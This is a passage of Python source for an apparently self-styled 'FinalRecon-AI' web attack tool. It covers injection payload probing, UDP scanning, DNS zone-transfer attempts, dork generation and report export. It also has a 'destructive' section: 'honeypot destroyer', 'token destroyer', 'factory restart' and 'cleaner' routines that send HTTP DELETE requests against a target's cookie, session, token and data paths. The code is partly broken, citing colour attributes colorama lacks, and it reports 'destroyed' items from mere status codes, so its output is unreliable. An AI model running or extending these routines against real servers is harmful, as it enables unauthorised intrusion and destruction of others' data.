            except Exception:
                print(f"  {Fore.YELLOW}[ERROR]{Fore.RESET} {cve_name}")
        return self.cve_results

    # ============================================
    # v10000 NEW MODULE 31: INJECTION TESTS
    # ============================================
    def injection_tests(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] INJECTION TESTS (LDAP/NoSQL/XPath/SSTI/CRLF)")
        print(Fore.CYAN + "="*70)
        for inj_type, payloads in INJECTION_PAYLOADS.items():
            found = 0
            for pl in payloads:
                try:
                    test = f"{self.base_url}?q={quote(pl)}"
                    r = self._request('GET', test, allow_redirects=False)
                    # Heuristic: status change or error keywords
                    if r.status_code in (500, 400) or 'error' in r.text.lower()[:2000]:
                        found += 1
                        print(f"  {Fore.RED}[POSSIBLE]{Fore.RESET} {inj_type}: {pl[:50]}")
                        break
                except Exception:
                    pass
            self.injection_results[inj_type] = found
            if not found:
                print(f"  {Fore.GREEN}[SAFE?]{Fore.RESET} {inj_type}")
        return self.injection_results

    # ============================================
    # v10000 NEW MODULE 32: CSP BYPASS
    # ============================================
    def csp_bypass_test(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] CSP BYPASS ANALYSIS")
        print(Fore.CYAN + "="*70)
        try:
            r = self._request('GET', self.base_url)
            csp = r.headers.get('Content-Security-Policy', '')
            if not csp:
                print(f"  {Fore.RED}[VULN]{Fore.RESET} No CSP header")
                return self.csp_bypass_results
            print(f"  {Fore.OKCYAN}CSP: {csp[:200]}{Fore.RESET}")
            weak = []
            if "'unsafe-inline'" in csp: weak.append("unsafe-inline present")
            if "'unsafe-eval'" in csp:   weak.append("unsafe-eval present")
            if "script-src *" in csp or "default-src *" in csp:
                weak.append("wildcard sources")
            for w in weak:
                self.csp_bypass_results.append({"issue":w})
                print(f"  {Fore.RED}[WEAK]{Fore.RESET} {w}")
            if not weak:
                p_ok("CSP appears strong")
        except Exception as e:
            p_err(f"CSP test failed: {e}")
        return self.csp_bypass_results

    # ============================================
    # v10000 NEW MODULE 33: UDP SCAN
    # ============================================
    def udp_scan(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] UDP PORT SCAN")
        print(Fore.CYAN + "="*70)
        udp_ports = [53, 69, 123, 137, 138, 161, 162, 500, 514, 520, 1900, 4500]
        for p in udp_ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.settimeout(2.0)
                    s.sendto(b"\x00", (self.ip, p))
                    try:
                        s.recvfrom(1024)
                        self.udp_results.append({"port":p,"status":"open|filtered"})
                        print(f"  {Fore.GREEN}[OPEN|FILTERED]{Fore.RESET} UDP {p}")
                    except socket.timeout:
                        pass
            except Exception:
                pass
        if not self.udp_results:
            p_warn("No UDP ports responded (typical — UDP is silent)")
        return self.udp_results

    # ============================================
    # v10000 NEW MODULE 34: OS DETECT (passive)
    # ============================================
    def os_detect(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] OS DETECTION (PASSIVE via TTL)")
        print(Fore.CYAN + "="*70)
        try:
            # Try to get TTL via ping-like socket approach
            r = self._request('GET', self.base_url)
            server = r.headers.get('Server', '')
            if 'Linux' in server or 'Ubuntu' in server or 'Debian' in server:
                self.os_detect_results = {'os':'Linux (likely)', 'evidence': server}
            elif 'Win' in server or 'IIS' in server:
                self.os_detect_results = {'os':'Windows (likely)', 'evidence': server}
            elif 'BSD' in server:
                self.os_detect_results = {'os':'BSD (likely)', 'evidence': server}
            else:
                self.os_detect_results = {'os':'Unknown', 'evidence': server}
            print(f"  {Fore.OKCYAN}OS Guess: {self.os_detect_results['os']}{Fore.RESET}")
            print(f"  {Fore.OKCYAN}Evidence: {server}{Fore.RESET}")
        except Exception as e:
            p_err(f"OS detect failed: {e}")
        return self.os_detect_results

    # ============================================
    # v10000 NEW MODULE 35: WAYBACK MACHINE
    # ============================================
    def wayback_lookup(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] WAYBACK MACHINE LOOKUP")
        print(Fore.CYAN + "="*70)
        try:
            url = f"http://web.archive.org/cdx/search/cdx?url={self.hostname}*&output=json&limit=30"
            r = requests.get(url, timeout=15)
            if r.status_code == 200 and r.text:
                data = r.json()
                for row in data[1:31] if len(data) > 1 else []:
                    if len(row) >= 3:
                        self.wayback_results.append({"url": row[2], "timestamp": row[1]})
                        print(f"  {Fore.OKCYAN}[WAYBACK]{Fore.RESET} {row[1]} — {row[2][:80]}")
            p_ok(f"Total wayback entries: {len(self.wayback_results)}")
        except Exception as e:
            p_err(f"Wayback failed: {e}")
        return self.wayback_results

    # ============================================
    # v10000 NEW MODULE 36: GOOGLE DORK
    # ============================================
    def google_dork_generate(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] GOOGLE DORK GENERATION")
        print(Fore.CYAN + "="*70)
        dorks = [
            f"site:{self.hostname}",
            f"site:{self.hostname} inurl:admin",
            f"site:{self.hostname} inurl:login",
            f"site:{self.hostname} ext:php",
            f"site:{self.hostname} ext:env",
            f"site:{self.hostname} ext:sql",
            f"site:{self.hostname} ext:bak",
            f"site:{self.hostname} intitle:index of",
            f"site:{self.hostname} inurl:api",
            f"site:{self.hostname} inurl:config",
        ]
        for d in dorks:
            self.google_dork_results.append(d)
            print(f"  {Fore.YELLOW}[DORK]{Fore.RESET} {d}")
        return self.google_dork_results

    # ============================================
    # v10000 NEW MODULE 37: DNS ZONE TRANSFER
    # ============================================
    def dns_zone_transfer(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] DNS ZONE TRANSFER (AXFR)")
        print(Fore.CYAN + "="*70)
        if not DNS_AVAILABLE:
            p_warn("dnspython required")
            return []
        ns_records = self.dns_results.get('NS', [])
        if not ns_records:
            p_warn("No NS records — skipped")
            return []
        results = []
        for ns in ns_records[:5]:
            ns_host = str(ns).rstrip('.')
            try:
                zone = dns.zone.from_xfr(dns.query.xfr(ns_host, self.hostname, timeout=5))
                for name in zone.nodes:
                    results.append(str(name))
                    print(f"  {Fore.RED}[AXFR]{Fore.RESET} {name}")
                p_ok(f"ZONE TRANSFER SUCCESS via {ns_host}")
                return results
            except Exception as e:
                print(f"  {Fore.GREEN}[REFUSED]{Fore.RESET} {ns_host} ({e})")
        p_ok("All NS refused AXFR — good")
        return results

    # ============================================
    # v10000 NEW MODULE 38: DNSSEC CHECK    # ============================================
    def dnssec_check(self):
        print(Fore.CYAN + "\n" + "="*70)
        print(Fore.CYAN + "[+] DNSSEC VALIDATION CHECK")
        print(Fore.CYAN + "="*70)
        if not DNS_AVAILABLE:
            p_warn("dnspython required")
            return {}
        result = {}
        try:
            answers = dns.resolver.resolve(self.hostname, 'DNSKEY', lifetime=5)
            result['dnskey'] = [str(r) for r in answers][:3]
            p_ok(f"DNSSEC DNSKEY records: {len(answers)}")
        except Exception:
            result['dnskey'] = []
            p_warn("No DNSKEY records — DNSSEC likely not enabled")
        try:
            answers = dns.resolver.resolve(self.hostname, 'DS', lifetime=5)
            result['ds'] = [str(r) for r in answers][:3]
            p_ok(f"DS records found: {len(answers)}")
        except Exception:
            result['ds'] = []
            p_warn("No DS records")
        return result

    # ============================================
    # v10000 NEW MODULE 39: COMPLIANCE CHECK
    # ============================================
    def compliance_check(self):
        print(Fore.COMPLIANCE + "\n" + "="*70)
        print(Fore.COMPLIANCE + "[+] COMPLIANCE CHECKS (HIPAA / PCI-DSS / GDPR / ISO27001 / NIST)")
        print(Fore.COMPLIANCE + "="*70)
        try:
            r = self._request('GET', self.base_url)
            h = r.headers
            checks = {
                'HSTS': 'Strict-Transport-Security' in h,
                'CSP':  'Content-Security-Policy' in h,
                'X-Frame-Options': 'X-Frame-Options' in h,
                'X-Content-Type-Options': 'X-Content-Type-Options' in h,
                'Referrer-Policy': 'Referrer-Policy' in h,
                'Permissions-Policy': 'Permissions-Policy' in h,
                'HTTPS': self.base_url.startswith('https://'),
            }
            frameworks = {
                'PCI-DSS': ['HSTS','CSP','X-Frame-Options','X-Content-Type-Options','HTTPS'],
                'HIPAA':   ['HSTS','CSP','X-Frame-Options','HTTPS'],
                'GDPR':    ['HSTS','CSP','HTTPS'],
                'ISO27001':['HSTS','CSP','X-Frame-Options','X-Content-Type-Options'],
                'NIST':    ['HSTS','CSP','X-Frame-Options','X-Content-Type-Options','Referrer-Policy'],
            }
            for fw, req in frameworks.items():
                passed = sum(1 for c in req if checks.get(c))
                score = (passed / len(req)) * 100
                self.compliance_results[fw] = {
                    'score': f"{score:.0f}%", 'passed': passed, 'total': len(req),
                }
                color = Fore.GREEN if score >= 80 else (Fore.YELLOW if score >= 50 else Fore.RED)
                print(f"  {color}[{fw}]{Fore.RESET} {score:.0f}% ({passed}/{len(req)})")
        except Exception as e:
            p_err(f"Compliance check failed: {e}")
        return self.compliance_results

    # ============================================
    # v10000 NEW MODULE 40: MITRE ATT&CK MAP
    # ============================================
    def mitre_attack_map(self):
        print(Fore.SMART + "\n" + "="*70)
        print(Fore.SMART + "[+] MITRE ATT&CK MAPPING")
        print(Fore.SMART + "="*70)
        self.mitre_mapping = MITRE_MAPPING
        for tactic, techniques in MITRE_MAPPING.items():
            print(f"  {Fore.OKCYAN}{tactic}{Fore.RESET}:")
            for t in techniques:
                print(f"      - {t}")
        return self.mitre_mapping

    # ============================================
    # v10000 NEW MODULE 41: OWASP TOP 10 MAP
    # ============================================
    def owasp_top10_map(self):
        print(Fore.SMART + "\n" + "="*70)
        print(Fore.SMART + "[+] OWASP TOP 10 MAPPING")
        print(Fore.SMART + "="*70)
        for code, name in OWASP_TOP10.items():
            print(f"  {Fore.OKCYAN}{code}{Fore.RESET}: {name}")
        self.owasp_mapping = OWASP_TOP10
        return self.owasp_mapping

    # ============================================
    # v10000 NEW MODULE 42: RISK MATRIX
    # ============================================
    def risk_matrix_build(self):
        print(Fore.SMART + "\n" + "="*70)
        print(Fore.SMART + "[+] RISK MATRIX")
        print(Fore.SMART + "="*70)
        total = (len(self.vuln_scan_results) + len(self.secret_results) +
                 len(self.cors_results) + len(self.cve_results) +
                 len(self.lfi_results) + len(self.ssrf_results))
        if total >= 10:   level = "CRITICAL"
        elif total >= 5:  level = "HIGH"
        elif total >= 2:  level = "MEDIUM"
        elif total >= 1:  level = "LOW"
        else:             level = "INFO"
        self.risk_matrix = {"total_findings": total, "level": level}
        print(f"  {Fore.OKCYAN}Total Findings: {total}{Fore.RESET}")
        print(f"  {Fore.OKCYAN}Risk Level    : {level}{Fore.RESET}")
        return self.risk_matrix

    # ============================================
    # v10000 NEW MODULE 43: REMEDIATION PLAN
    # ============================================
    def remediation_plan_build(self):
        print(Fore.SMART + "\n" + "="*70)
        print(Fore.SMART + "[+] REMEDIATION PLAN")
        print(Fore.SMART + "="*70)
        plan = []
        if self.cors_results:        plan.append("Fix CORS: whitelist specific origins")
        if self.secret_results:      plan.append("Rotate exposed secrets immediately")
        if self.backup_results:      plan.append("Remove backup files from web root")
        if self.git_results:         plan.append("Block .git/.svn access at web server")
        if self.env_results:         plan.append("Block .env/config file access")
        if self.lfi_results:         plan.append("Sanitize file/path parameters")
        if self.ssrf_results:        plan.append("Whitelist outbound URLs")
        if self.open_redirect_results: plan.append("Validate redirect targets")
        if self.csp_bypass_results:  plan.append("Strengthen CSP policy")
        if not plan:                 plan.append("No major remediation required")
        for i, p in enumerate(plan, 1):
            self.remediation_plan.append(p)
            print(f"  {Fore.YELLOW}[{i}]{Fore.RESET} {p}")
        return self.remediation_plan

    # ============================================
    # v10000 NEW MODULE 44: EXEC SUMMARY
    # ============================================
    def executive_summary(self):
        print(Fore.SMART + "\n" + "="*70)
        print(Fore.SMART + "[+] EXECUTIVE SUMMARY")
        print(Fore.SMART + "="*70)
        self.exec_summary = {
            "target": self.target,
            "scan_time": datetime.datetime.now().isoformat(),
            "risk_level": self.risk_matrix.get("level", "UNKNOWN"),
            "total_findings": self.risk_matrix.get("total_findings", 0),
            "subdomains_found": len(self.subdomain_results),
            "open_ports": len(self.port_scan_results),
            "tech_detected": len(self.tech_results),
            "api_endpoints": len(self.api_results),
            "secrets_found": len(self.secret_results),
            "cve_tests_run": len(self.cve_results),
            "compliance_scores": self.compliance_results,
        }
        for k, v in self.exec_summary.items():
            print(f"  {Fore.OKCYAN}{k:<20}{Fore.RESET}: {v}")
        return self.exec_summary

    # ============================================
    # v5000 destructive (kept)
    # ============================================
    def break_honeypot_wall(self):
        print(Fore.WALL + "\n" + "="*70)
        print(Fore.WALL + "[!!!] HONEYPOT WALL BREAKER")
        print(Fore.WALL + "="*70)
        for path in HONEYPOT_PATTERNS['wall']:
            try:
                url = self.base_url + path
                r = self._request('GET', url, timeout=3, allow_redirects=False)
                if r.status_code in (200,201,202,204,301,302):
                    self.honeypot_wall_broken += 1
                    p_wall(f"HONEYPOT-WALL-BROKEN: {path} ({r.status_code})")
            except Exception:
                pass
        p_wall(f"Total walls broken: {self.honeypot_wall_broken}")
        return self.honeypot_wall_broken

    def break_firewall_wall(self):
        print(Fore.WALL + "\n" + "="*70)
        print(Fore.WALL + "[!!!] FIREWALL WALL BREAKER")
        print(Fore.WALL + "="*70)
        for cat, patterns in FIREWALL_WALL_PATTERNS.items():
            for path in patterns:
                try:
                    url = self.base_url + path
                    r = self._request('GET', url, timeout=3, allow_redirects=False)
                    if r.status_code in (200,201,202,204,301,302):
                        self.firewall_wall_broken += 1
                        p_wall(f"FIREWALL-WALL-BROKEN: {path} ({r.status_code})")
                except Exception:
                    pass
        p_wall(f"Total firewall walls broken: {self.firewall_wall_broken}")
        return self.firewall_wall_broken

    def detect_honeypot(self):
        print(Fore.HONEYPOT + "\n" + "="*70)
        print(Fore.HONEYPOT + "[!!!] HONEYPOT DETECTOR")
        print(Fore.HONEYPOT + "="*70)
        for path in HONEYPOT_PATTERNS['detect']:
            try:
                url = self.base_url + path
                r = self._request('GET', url, timeout=3, allow_redirects=False)
                if r.status_code in (200,301,302,401,403):
                    self.honeypot_found += 1
                    p_hp(f"Detected: {path} ({r.status_code})")
            except Exception:
                pass
        p_hp(f"Total honeypots detected: {self.honeypot_found}")
        return self.honeypot_found

    def destroy_honeypot(self):
        print(Fore.HONEYPOT + "\n" + "="*70)
        print(Fore.HONEYPOT + "[!!!] HONEYPOT DESTROYER")
        print(Fore.HONEYPOT + "="*70)
        for cat in ['destroy','disable','reset']:
            for path in HONEYPOT_PATTERNS[cat]:
                try:
                    url = self.base_url + path
                    r = self._request('GET', url, timeout=3, allow_redirects=False)
                    if r.status_code in (200,201,202,204,301,302):
                        self.honeypot_destroyed += 1
                        p_hp(f"DESTROYED: {path} ({r.status_code})")
                except Exception:
                    pass
        p_hp(f"Total destroyed: {self.honeypot_destroyed}")
        return self.honeypot_destroyed

    def destroy_tokens(self):
        print(Fore.TOKEN + "\n" + "="*70)
        print(Fore.TOKEN + "[!!!] TOKEN DESTROYER")
        print(Fore.TOKEN + "="*70)
        for ttype, patterns in TOKEN_CLEANER_TARGETS.items():
            for path in patterns:
                try:
                    url = self.base_url + path
                    r = self._request('GET', url, timeout=3, allow_redirects=False)
                    if r.status_code in (200,201,202,204,301,302,403):
                        self.token_stats['total'] += 1
                        p_token(f"DESTROYED [{ttype}]: {path}")
                except Exception:
                    pass
        p_token(f"Total tokens destroyed: {self.token_stats['total']}")
        return self.token_stats

    def factory_restart(self):
        print(Fore.FACTORY + "\n" + "="*70)
        print(Fore.FACTORY + "[!!!] FACTORY RESTART")
        print(Fore.FACTORY + "="*70)
        for cat, patterns in FACTORY_RESTART_PATTERNS.items():
            for path in patterns:
                try:
                    url = self.base_url + path
                    r = self._request('GET', url, timeout=3, allow_redirects=False)
                    if r.status_code in (200,201,202,204,301,302):
                        self.factory_stats['total'] += 1
                        p_fact(f"{cat.upper()}: {path}")
                except Exception:
                    pass
        p_fact(f"Total factory ops: {self.factory_stats['total']}")
        return self.factory_stats

    # ============================================
    # CLEANER
    # ============================================
    def cleaner_data_all_servers(self):
        print(Fore.CLEANER + "\n" + "="*70)
        print(Fore.CLEANER + "[!!!] CLEANER DATA — ALL SERVERS")
        print(Fore.CLEANER + "="*70)
        for server_name in SERVER_COOKIES_MAP.keys():
            self._cleaner_data_server(server_name)
        print(Fore.CLEANER + "\n[!!!] CLEANER DATA FINAL REPORT")
        for k, v in self.cleaner_stats.items():
            p_ok(f"{k}: {v}")

    def _cleaner_data_server(self, server_name):
        print(Fore.CLEANER + f"\n[CLEANER] {server_name}")
        targets = SERVER_COOKIES_MAP.get(server_name, {})
        for category, paths in targets.items():
            for path in paths:
                try:
                    url = self.base_url + path
                    r = self._request('GET', url, timeout=3, allow_redirects=False)
                    if r.status_code in (200,301,302,403):
                        try: self.session.delete(url, timeout=3, verify=False)
                        except: pass
                        if category == 'cookies': self.cleaner_stats['cookies_cleaned'] += 1
                        if category == 'sessions': self.cleaner_stats['sessions_cleaned'] += 1
                        if category in ('data','site_data'): self.cleaner_stats['data_cleaned'] += 1
                        if category == 'tokens': self.cleaner_stats['tokens_cleaned'] += 1
                        if category == 'devices': self.cleaner_stats['devices_cleaned'] += 1
                        self.cleaner_stats['total_cleaned'] += 1
                        p_clean(f"OKAY - CLEANED [{server_name}/{category}]: {path}")
                        self.cookies_data_deleted_okay.append(
                            {'server':server_name,'category':category,'path':path}
                        )
                except Exception:
                    pass

    def delete_server_cookies_data(self, server_name):
        if server_name not in SERVER_COOKIES_MAP:
            p_warn(f"Unknown server category: {server_name}")
            return []
        print(Fore.CLEANER + f"\n[CLEANER] {server_name} cookies data")
        deleted = []
        for category, paths in SERVER_COOKIES_MAP[server_name].items():
            for path in paths:
                try:
                    url = self.base_url + path
                    r = self._request('GET', url, timeout=3, allow_redirects=False)
                    if r.status_code in (200,301,302,403):
                        try: self.session.delete(url, timeout=3, verify=False)
                        except: pass
                        p_clean(f"OKAY - [{server_name}/{category}]: {path}")
                        deleted.append({'server':server_name,'category':category,'path':path})
                        self.cookies_data_deleted_okay.append(deleted[-1])
                except Exception:
                    pass
        return deleted

    def delete_all_servers_cookies_data(self):
        print(Fore.CLEANER + "\n[!!!] DELETE COOKIES — ALL SERVERS")
        for name in SERVER_COOKIES_MAP.keys():
            self.delete_server_cookies_data(name)
        p_ok(f"Total cookies entries deleted: {len(self.cookies_data_deleted_okay)}")

    def delete_complete_server_data(self, server_name):
        if server_name not in SERVER_COOKIES_MAP:
            return []
        print(Fore.CLEANER + f"\n[CLEANER] {server_name} COMPLETE DATA")
        all_targets = []
        for cat, paths in SERVER_COOKIES_MAP[server_name].items():
            for path in paths:
                all_targets.append((cat, path))
        seen, unique = set(), []
        for cat, path in all_targets:
            if path not in seen:
                seen.add(path); unique.append((cat, path))
        for cat, path in unique:
            try:
                url = self.base_url + path
                r = self._request('GET', url, timeout=3, allow_redirects=False)
                if r.status_code in (200,301,302,403):
                    try: self.session.delete(url, timeout=3, verify=False)
                    except: pass
                    p_clean(f"OKAY - [{server_name}/{cat}]: {path}")
                    self.cookies_site_data_deleted_okay.append(
                        {'server':server_name,'category':cat,'path':path}
                    )
            except Exception:
                pass
        return self.cookies_site_data_deleted_okay

    def delete_all_servers_complete_data(self):
        print(Fore.CLEANER + "\n[!!!] DELETE COMPLETE DATA — ALL SERVERS")
        for name in SERVER_COOKIES_MAP.keys():
            self.delete_complete_server_data(name)
        p_ok(f"Total complete-data entries deleted: {len(self.cookies_site_data_deleted_okay)}")

    # ============================================
    # WAF / ISP
    # ============================================
    def detect_waf(self):
        print(Fore.WAF + "\n" + "="*70)
        print(Fore.WAF + "[!!!] WAF DETECTOR")
        print(Fore.WAF + "="*70)
        try:
            r = self._request('GET', self.base_url)
            headers_str = str(r.headers).lower()
            content_str = r.text.lower()[:3000]
            for waf_name, sigs in WAF_SIGNATURES.items():
                for sig in sigs:
                    if sig in headers_str or sig in content_str:
                        self.waf_found.append(waf_name)
                        p_waf(f"WAF detected: {waf_name}")
                        break
            if not self.waf_found:
                p_ok("No WAF signature detected")
        except Exception as e:
            p_err(f"WAF detection failed: {e}")
        return self.waf_found

    def detect_isp_block(self):
        print(Fore.ISP + "\n" + "="*70)
        print(Fore.ISP + "[!!!] ISP DETECTOR")
        print(Fore.ISP + "="*70)
        try:
            r = requests.get(f"http://ip-api.com/json/{self.ip}", timeout=TIMEOUT)
            if r.status_code == 200:
                d = r.json()
                if d.get('status') == 'success':
                    p_isp(f"ISP: {d.get('isp')}  AS: {d.get('as')}")
        except Exception:
            pass

    def security_audit(self):
        print(Fore.YELLOW + "\n" + "="*70)
        print(Fore.YELLOW + "[!!!] SECURITY AUDIT")
        print(Fore.YELLOW + "="*70)
        try:
            r = self._request('GET', self.base_url)
            for h in ['Strict-Transport-Security','X-Frame-Options',
                      'X-Content-Type-Options','X-XSS-Protection',
                      'Content-Security-Policy','Referrer-Policy']:
                if h in r.headers: p_ok(f"Header: {h}")
                else:              p_warn(f"Missing: {h}")
        except Exception as e:
            p_err(f"Audit failed: {e}")

    def data_leak_detector(self):
        print(Fore.RED + "\n" + "="*70)
        print(Fore.RED + "[!!!] DATA LEAK DETECTOR")
        print(Fore.RED + "="*70)
        patterns = {
            'Email':  r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'API Key':r'(?:api[_-]?key|apikey)["\']?\s*[:=]\s*["\']([a-zA-Z0-9\-_.]{20,})["\']',
            'Token':  r'(?:token|bearer)\s+([a-zA-Z0-9\-_.]{20,})',
        }
        try:
            r = self._request('GET', self.base_url)
            found = 0
            for lt, pat in patterns.items():
                matches = re.findall(pat, r.text, re.IGNORECASE)
                if matches:
                    found += 1
                    print(f"  {Fore.RED}[!] {lt} leak: {len(matches)} found{Fore.RESET}")
            if found == 0:
                p_ok("No data leaks detected")
        except Exception as e:
            p_err(f"Data leak detection failed: {e}")

    # ============================================
    # EXPORT: TXT / JSON / CSV / HTML / MD / SARIF
    # ============================================
    def _collect_all(self):
        return {
            "target": self.target, "hostname": self.hostname, "ip": self.ip,
            "port": self.port, "time": datetime.datetime.now().isoformat(),
            "subdomains": self.subdomain_results, "dns": self.dns_results,
            "whois": self.whois_results,
            "ssl": {"protocol": self.ssl_results.get("protocol"),
                    "cipher": self.ssl_results.get("cipher")},
            "headers": self.header_results, "isp": self.isp_results,
            "directories": self.directory_results, "ports": self.port_scan_results,
            "crawler": self.crawler_results, "vuln": self.vuln_scan_results,
            "waf": self.waf_found, "tech": self.tech_results, "api": self.api_results,
            "secrets": self.secret_results, "cors": self.cors_results,
            "http_methods": self.http_methods_results,
            "backup": self.backup_results, "git": self.git_results,
            "env": self.env_results, "open_redirect": self.open_redirect_results,
            "lfi": self.lfi_results, "ssrf": self.ssrf_results,
            "cloud": self.cloud_results, "graphql": self.graphql_results,
            "jwt": self.jwt_results, "tls": self.tls_results,
            "ct_logs": self.ct_logs, "subdomain_takeover": self.subdomain_takeover,
            "cve_results": self.cve_results, "injection_results": self.injection_results,
            "csp_bypass": self.csp_bypass_results, "udp": self.udp_results,
            "os_detect": self.os_detect_results, "wayback": self.wayback_results,
            "google_dorks": self.google_dork_results,
            "compliance": self.compliance_results,
            "mitre": self.mitre_mapping, "owasp": self.owasp_mapping,
            "risk_matrix": self.risk_matrix, "exec_summary": self.exec_summary,
            "remediation": self.remediation_plan,
            "cleaner_stats": self.cleaner_stats,
            "cookies_deleted": self.cookies_data_deleted_okay,
            "complete_deleted": self.cookies_site_data_deleted_okay,
        }

    def export_results_txt(self):
        os.makedirs(CONFIG['export_dir'], exist_ok=True)
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        filepath = os.path.join(CONFIG['export_dir'], f"finalrecon_{self.hostname}_{ts}.txt")
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write("="*80 + "\n")
                f.write(f"FINALRECON-AI v{VERSION} - {RELEASE_NAME}\n")
                f.write("WEB SERVER ONLY | QUANTUM AUTONOMOUS\n")
                f.write("="*80 + "\n")
                f.write(json.dumps(self._collect_all(), indent=2, default=str))
            p_ok("TXT report", filepath)
            return filepath
        except Exception as e:
            p_err(f"TXT export failed: {e}")
            return None

    def export_json(self, filepath=None):
        os.makedirs(CONFIG['export_dir'], exist_ok=True)
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        filepath = filepath or os.path.join(CONFIG['export_dir'], f"finalrecon_{self.hostname}_{ts}.json")
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(self._collect_all(), f, indent=2, default=str)
            p_ok("JSON report", filepath)
            return filepath
        except Exception as e:
            p_err(f"JSON export failed: {e}")
            return None

    def export_csv(self, filepath=None):
        os.makedirs(CONFIG['export_dir'], exist_ok=True)
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        filepath = filepath or os.path.join(CONFIG['export_dir'], f"finalrecon_{self.hostname}_{ts}.csv")
        try:
            with open(filepath, 'w', newline='', encoding='utf-8') as f:
                w = csv.writer(f)
                w.writerow(['Type', 'Value', 'Detail'])
                for sub, ip in self.subdomain_results: w.writerow(['subdomain', sub, ip])
                for d in self.directory_results:       w.writerow(['directory', d.get('url'), d.get('status')])
                for p in self.port_scan_results:       w.writerow(['port', p.get('port'), p.get('service')])
                for v in self.vuln_scan_results:       w.writerow(['vuln', v, ''])
                for s in self.secret_results:          w.writerow(['secret', s.get('type'), s.get('sample')])
                for c in self.cve_results:             w.writerow(['cve', c.get('cve'), c.get('status')])
            p_ok("CSV report", filepath)
            return filepath
        except Exception as e:
            p_err(f"CSV export failed: {e}")
            return None

    def export_html(self, filepath=None):
        os.makedirs(CONFIG['export_dir'], exist_ok=True)
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        filepath = filepath or os.path.join(CONFIG['export_dir'], f"finalrecon_{self.hostname}_{ts}.html")
        try:
            data = self._collect_all()
            html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>FinalRecon-AI v{VERSION} — {self.hostname}</title>
<style>
body {{ font-family:'Segoe UI',sans-serif; background:#0d1117; color:#c9d1d9; padding:20px; }}
h1 {{ color:#58a6ff; }} h2 {{ color:#79c0ff; border-bottom:1px solid #30363d; padding-bottom:6px; }}
pre {{ background:#161b22; padding:12px; border-radius:6px; overflow-x:auto; }}
.high {{ color:#f85149; font-weight:bold; }} .mid {{ color:#d29922; }} .ok {{ color:#3fb950; }}
</style></head><body>
<h1>FinalRecon-AI v{VERSION} — QUANTUM EDITION</h1>
<p><b>Target:</b> {data['target']}</p><p><b>IP:</b> {data['ip']} <b>Port:</b> {data['port']}</p>
<p><b>Time:</b> {data['time']}</p>
<h2>Executive Summary</h2><pre>{json.dumps(data['exec_summary'], indent=2)}</pre>
<h2>Risk Matrix</h2><pre class="high">{json.dumps(data['risk_matrix'], indent=2)}</pre>
<h2>Compliance</h2><pre>{json.dumps(data['compliance'], indent=2)}</pre>
<h2>Subdomains</h2><pre>{json.dumps(data['subdomains'], indent=2)}</pre>
<h2>DNS</h2><pre>{json.dumps(data['dns'], indent=2)}</pre>
<h2>WHOIS</h2><pre>{json.dumps(data['whois'], indent=2)}</pre>
<h2>SSL</h2><pre>{json.dumps(data['ssl'], indent=2)}</pre>
<h2>Headers</h2><pre>{json.dumps(data['headers'], indent=2)}</pre>
<h2>ISP</h2><pre>{json.dumps(data['isp'], indent=2)}</pre>
<h2>Directories</h2><pre>{json.dumps(data['directories'], indent=2)}</pre>
<h2>Ports</h2><pre>{json.dumps(data['ports'], indent=2)}</pre>
<h2>Vulnerabilities</h2><pre class="high">{json.dumps(data['vuln'], indent=2)}</pre>
<h2>CVE Tests</h2><pre class="high">{json.dumps(data['cve_results'], indent=2)}</pre>
<h2>Secrets</h2><pre class="high">{json.dumps(data['secrets'], indent=2)}</pre>
<h2>CORS</h2><pre>{json.dumps(data['cors'], indent=2)}</pre>
<h2>Backup Files</h2><pre>{json.dumps(data['backup'], indent=2)}</pre>
<h2>Git Exposure</h2><pre>{json.dumps(data['git'], indent=2)}</pre>
<h2>Env Exposure</h2><pre>{json.dumps(data['env'], indent=2)}</pre>
<h2>Cloud Metadata</h2><pre class="high">{json.dumps(data['cloud'], indent=2)}</pre>
<h2>GraphQL</h2><pre>{json.dumps(data['graphql'], indent=2)}</pre>
<h2>JWT</h2><pre>{json.dumps(data['jwt'], indent=2)}</pre>
<h2>TLS</h2><pre>{json.dumps(data['tls'], indent=2)}</pre>
<h2>CT Logs</h2><pre>{json.dumps(data['ct_logs'], indent=2)}</pre>
<h2>Subdomain Takeover</h2><pre>{json.dumps(data['subdomain_takeover'], indent=2)}</pre>
<h2>MITRE ATT&CK</h2><pre>{json.dumps(data['mitre'], indent=2)}</pre>
<h2>OWASP Top 10</h2><pre>{json.dumps(data['owasp'], indent=2)}</pre>
<h2>Remediation Plan</h2><pre>{json.dumps(data['remediation'], indent=2)}</pre>
</body></html>"""
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(html)
            p_ok("HTML report", filepath)
            return filepath
        except Exception as e:
            p_err(f"HTML export failed: {e}")
            return None

    def export_markdown(self, filepath=None):
        os.makedirs(CONFIG['export_dir'], exist_ok=True)
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        filepath = filepath or os.path.join(CONFIG['export_dir'], f"finalrecon_{self.hostname}_{ts}.md")
        try:
            d = self._collect_all()
            md = f"""# FinalRecon-AI v{VERSION} Report

**Target:** {d['target']}  
**IP:** {d['ip']}  
**Port:** {d['port']}  
**Time:** {d['time']}  

## Executive Summary

"""
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(md)
            p_ok("Markdown report", filepath)
            return filepath
        except Exception as e:
            p_err(f"MD export failed: {e}")
            return None

    def export_sarif(self, filepath=None):
        os.makedirs(CONFIG['export_dir'], exist_ok=True)
